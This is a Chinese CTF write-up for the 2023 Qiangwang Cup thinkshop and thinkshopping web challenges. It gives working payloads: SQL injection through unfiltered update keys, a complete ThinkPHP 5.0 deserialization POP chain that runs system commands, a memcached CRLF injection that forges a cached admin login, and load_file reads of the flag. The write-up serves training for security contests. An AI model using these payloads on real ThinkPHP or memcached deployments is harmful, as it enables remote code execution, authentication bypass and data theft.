#  [CTF复现计划]2023强网杯初赛 thinkshop[ping]   
 Dest0g3 Team   2023-12-18 18:47  
  
## 前言  
  
“大头SEC”公众号专注于CTF、AWD、AWD Plus、RDG等竞赛题目复现。  
  
在“大头SEC”公众号正式开始运营以前，“CTF复现计划”已经运营了一段时间，“CTF复现计划”旨在解决各位CTFer在赛后因平台关闭导致无法复现的问题。截止10月18日，“CTF复现计划”已经在语雀公开分享20余个复现环境，30余篇WriteUp。（“CTF复现计划”语雀直达链接：https://www.yuque.com/dat0u/ctf）  
  
而在“大头SEC”公众号中会分享“CTF复现计划”中相对精彩的竞赛题目，同样也提供复现环境及WriteUp。  
## 题目信息  
> 本题涉及知识点：ThinkPHP代码审计、Memcached、ThinkPHP v5.0反序列化链  
  
- • 题目类型：CTF  
  
- • 题目名称：2023强网杯初赛 thinkshop[ping]  
  
- • 题目镜像：附件内，自行搭建  
  
- • 内部端口：80  
  
- • 题目附件：6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xdkZHcTl1VG14NzR1TUZudEMwX3lSQT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=（自行Base64解码）  
  
## 启动脚本  
  
下载附件后，阅读附件里的README.txt：  
  
thinkshop：  
```
docker load < thinkshop.tar
docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag{test_flag} thinkshop
```  
  
thinkshopping：  
```
docker load < thinkshopping.tar
docker run -tid --name thinkshop -p 36001:80 -e FLAG=flag{test_flag} 镜像ID
```  
  
用goods_edit.html文件替换镜像中的/var/www/html/application/index/view/admin/goods_edit.html  
## WriteUp  
### thinkshop  
  
先看第一个题，文件结构如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3UvZCFpCsZCdlNicEgiavaeV5vGl9xkUHBibFJ36vJtmz0uHmibicfLknKpQ/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
题目给了容器，可以看看容器是怎么启动的，启动apache2和mysql都是常规操作，注意最后一行，在11211端口启动了memcached（当然，第一题和memcached没有半毛钱关系，一开始就在看memcached的CRLF，直到第一晚的后半夜这题被打烂了，才开始换思路）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3rLBfjutjU8NkGBzhzicI0Mibr98UVZeJrkjZjJoVibMTl65ThB5iaRtzNw/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
再看看执行的shop.sql和goods.sql，其中shop.sql中插入了一条admin的数据，密码为e10打头MD5加密值（一眼就是123456）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3IZn6qOUARzMxjlSE3ic76woTT03hVEMFGLiaRhic4nzEic1cReOjl7ictdA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
其中Admin.php下的方法路由，除了login和register之外都需要鉴权，核心的查询语句如下：  
- • 从admin表里查询数据，将密码做md5之后做比对，比对成功之后鉴权成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3qG8zKFnJXia1s1n7DXvjqhzjjxDvEvjLa9hvNGS6EZAdEO9MBdoSiccA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
这时候，大多数人应该都是直接输入admin、admin，但是显示登录失败（怀疑人生了几个小时） 这里登录失败的原因是，传入的username直接放到了find方法的参数中，一般来说，如果需要限制查询条件，会放在where方法里边，而find()一般都是放在最后，处于无参状态。但是这里既然有参，就肯定能用，在find有参数的情况下，默认会去找数据表中的主键列，所以这里使用1、123456登录到后台即可。  
  
到了后台，就该思考如何rce了，看到good_edit.html页中，会对数据库中的data列做反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3MTekvBRpLQ9qVicaQRGqzPAicXibS0wxskEecic2NvCD16qllyFiczKRvZw/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
由于使用了ThinkPHP 5.0的框架，所以可以用该框架下的链实现反序列化RCE，那接下来要做的就是想办法控制数据库中的数据  
  
在Admin.php的do_edit方法中，会将POST体里的所有数据交给saveGoods处理  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3GDIiafSAvBibqrRNicn1smFWibgGNdWzmMt4tGDlG5Z3wZ0ny7x30gA3JA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
再交给save方法处理，注意：这个过程中，$data这个数组都是完全可控的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3oPic8Wpc1VTicPz8aCFb5x5eoqlicXzlQiaX08CPLQrn9lrUq67jrAfpaw/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
由于数组可控，所以数组的键和值都是完全可控的，在updatedata中，$key这个地方没有做过滤，所以在这个地方会造成SQL注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3l0AjLNnDlLlfWJSoUBjH8ewqx0Ml3qgvKZaZhLh9VkFb9yMCBvbGfQ/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
注入的payload就是下方这样，注意传参的时候，给=符号做url编码，由于参数名带有空格，会被PHP解析为下划线，所以用/**/绕过一下即可  
```
data`%3Dunhex('这里填十六进制数据')/**/where/**/id%3D1/**/or/**/6%3D6#=1&id=1&name=a&price=100.00&image=1&data=

```  
  
而十六进制数据处就找一条ThinkPHP 5.0的链子改改就行  
```
<?php
namespace think\process\pipes{
    use think\model\Pivot;
    ini_set('display_errors',1);
    class Windows{
        private $files = [];
        public function __construct($function,$parameter)
        {
            $this->files = [new Pivot($function,$parameter)];
        }
    }
    $a = array(new Windows('system','cat /*'));
    echo bin2hex(base64_encode(serialize($a)));
}
namespace think{
    abstract class Model
    {}
}
namespace think\model{
    use think\Model;
    use think\console\Output;
    class Pivot extends Model    {
        protected $append = [];
        protected $error;
        public $parent;
        public function __construct($function,$parameter)
        {
            $this->append['jelly'] = 'getError';
            $this->error = new relation\BelongsTo($function,$parameter);
            $this->parent = new Output($function,$parameter);
        }
    }
    abstract class Relation    {}
}
namespace think\model\relation{
    use think\db\Query;
    use think\model\Relation;
    abstract class OneToOne extends Relation    {}
    class BelongsTo extends OneToOne    {
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        public function __construct($function,$parameter)
        {
            $this->selfRelation = false;
            $this->query = new Query($function,$parameter);
            $this->bindAttr = [''];
        }
    }
}
namespace think\db{
    use think\console\Output;
    class Query    {
        protected $model;
        public function __construct($function,$parameter)
        {
            $this->model = new Output($function,$parameter);
        }
    }
}
namespace think\console{
    use think\session\driver\Memcache;
    class Output    {
        protected $styles = [];
        private $handle;
        public function __construct($function,$parameter)
        {
            $this->styles = ['getAttr'];
            $this->handle = new Memcache($function,$parameter);
        }
    }
}
namespace think\session\driver{
    use think\cache\driver\Memcached;
    class Memcache    {
        protected $handler = null;
        protected $config  = [
            'expire'       => '',
            'session_name' => '',
        ];
        public function __construct($function,$parameter)
        {
            $this->handler = new Memcached($function,$parameter);
        }
    }
}
namespace think\cache\driver{
    use think\Request;
    class Memcached    {
        protected $handler;
        protected $options = [];
        protected $tag;
        public function __construct($function,$parameter)
        {
            // pop链中需要prefix存在，否则报错
            $this->options = ['prefix'   => 'jelly/'];
            $this->tag = true;
            $this->handler = new Request($function,$parameter);
        }
    }
}
namespace think{
    class Request
    {
        protected $get     = [];
        protected $filter;
        public function __construct($function,$parameter)
        {
            $this->filter = $function;
            $this->get = ["jelly"=>$parameter];
        }
    }
}
```  
  
由于数据包太长了，这里就不贴在文内了。  
### thinkshopping  
  
第二天又上了thinkshopping这一题，和前一题主要的区别是goods_edit.html中的反序列化入口被删了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3HW5e6FoZcNtJ8SdWtiazoEIgwVBPcZRD2GXYlQGIj2PXMicSpoM2ZXLA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
还有admin表中的内容被清空了，没有1、admin、e10adc3949ba59abbe56e057f20f883e这条数据了  
  
更重要的是，secure_file_priv的值为空了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml36Xap3nKIglodKT7wqeibhUM2LoDTwPAAOoUdiaDqWQeXNqalRBt1ksAQ/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
而前一题还是有值的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3tKZy1yU1QzkkA2niaCcGO29FPwkauGvAFtorDlTVIFYaeGyzEt8aEVQ/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
当然，前一题的SQL注入点依然存在，不过依然需要鉴权进入后台，这意味着，只需要我们能进入后台，就能通过load_file的方式读取flag。  
  
那么，如何进入到后台呢？前面提到，容器在启动的时候使用了memcached，但是在前一题中并没有用到  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3rLBfjutjU8NkGBzhzicI0Mibr98UVZeJrkjZjJoVibMTl65ThB5iaRtzNw/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
并且启动了memcached后，ThinkPHP中也配置了cache使用memcached做缓存  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3icL1zTMCPVV3Vyot8Zp7e10eFlsXeoFAkAmP0jYMvbw0rt3jyBDhSibA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
而在登录时，使用了cache先获取缓存  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3Ml9eGuHju3owSPLVgS9IRIuYiayibXkI5heFhoo0iaGY8Kn9BYt4XoNXg/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
跟进一下find逻辑，由于出题人配置了cache，所以会将数据缓存到memcached中，这里的缓存的key格式为：think:shop.admin|username  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3wm9CvOH8OtccByTYZ7iaLOU65W51W1sMyCMntHP89M57WFPFVTibPxdA/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
那么如何控制缓存的值呢？memcached存在CRLF注入漏洞，具体可参考下方文章：  
- • https://www.freebuf.com/vuls/328384.html  
  
简单来说，就是能set任意的值，例如下方的payload，就能注入一个snowwolf的键，且值为wolf，4代表数据长度  
```
TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf
等价于
set snowwolf 0 500 4
wolf
```  
  
那么我们需要注入一个怎么样的数据呢？我们可以看一下存储之后的数据是长什么样的，将下面的内容添加到路由，然后访问执行  
```
public function test(){
    $result = Db::query("select * from admin where id=1");
    var_dump($result);
    $a = "think:shop.admin|admin";
    Cache::set($a, $result, 3600);
}
```  
  
查看memcached中的值，长得像个序列化字符串  
```
telnet 127.0.0.1 11211
get think:shop.admin|admin
a:1:{i:0;a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";}}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml39xOj4ianqT92avMh8z78Be9E4kTYVJrRDIJTqKjHTALY8NTOacoSRvQ/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
这里有个坑点，就是memcached本身是没有数据类型的，只有key-value的概念，存放的都是字符串，但是PHP编程语言给它给予了数据类型的概念（当flags为0为字符串，当flags4为数组等等），我们看一下memcached的set命令格式：  
  
上图中的红色箭头所指向的4，就是下方的flags位置，也就是说，在PHP中，flags为4的缓存数据，被当做数组使用  
```
set key flags exptime bytes [noreply] 
value 
```  
  
所以我们在构造CRLF注入的命令时，需要注意在set时，把flags设置为4  
```
POST /public/index.php/index/admin/do_login.html HTTP/1.1
Host: eci-2ze7q6gtt4a3a07rywcf.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=korn6f9clt7oere36ke7pj7m70

username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&password=admin
```  
  
再用admin、admin去登录即可，登录到后台之后，再带上session去load_file读flag即可  
```
POST /public/index.php/index/admin/do_edit.html HTTP/1.1
Host: eci-2ze7q6gtt4a3a07rywcf.cloudeci1.ichunqiu.com
Content-Length: 183
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=korn6f9clt7oere36ke7pj7m70

data`%3Dunhex('')/**/,`name`%3Dload_file('/fffflllaaaagggg')/**/where/**/id%3D1/**/or/**/1%3D1#=1&id=1&name=a&price=100.00&on_sale_time=2023-05-05T02%3A20%3A54&image=1&data=%27%0D%0Aa
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml3sZ61wLiauaPbvUEj332Kojc1f2skSxnmu7fTNmVl5u7uhicd5QV7zib1g/640?wx_fmt=png&from=appmsg "null")  
  
image.png  
  
写的比较仓促，如有错误，欢迎指出。  
## “CTF复现计划”交流群  
1. 1. 语雀群文档：https://www.yuque.com/dat0u/ctf  
  
1. 2. 有需要复现的CTF赛题可以直接call群主（大头）  
  
1. 3. 本群提供赛题制作、赛题WriteUp编写等服务  
  
1. 4. 各位师傅可以随意拉人  
  
1. 5. 若群聊已超200人，无法通过二维码扫描加入，可以加vx：DatouYoo（备注CTF复现计划）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icibBdzwC6ics9L13oCuyd7ao0kYHTgmml32PM6XTWYgnmG2foh9iaAoiayGWlJh11ZdMVib70He1Lib1PdhpEaHHn16w/640?wx_fmt=jpeg&from=appmsg "null")  
  
image.png  
  
  
  
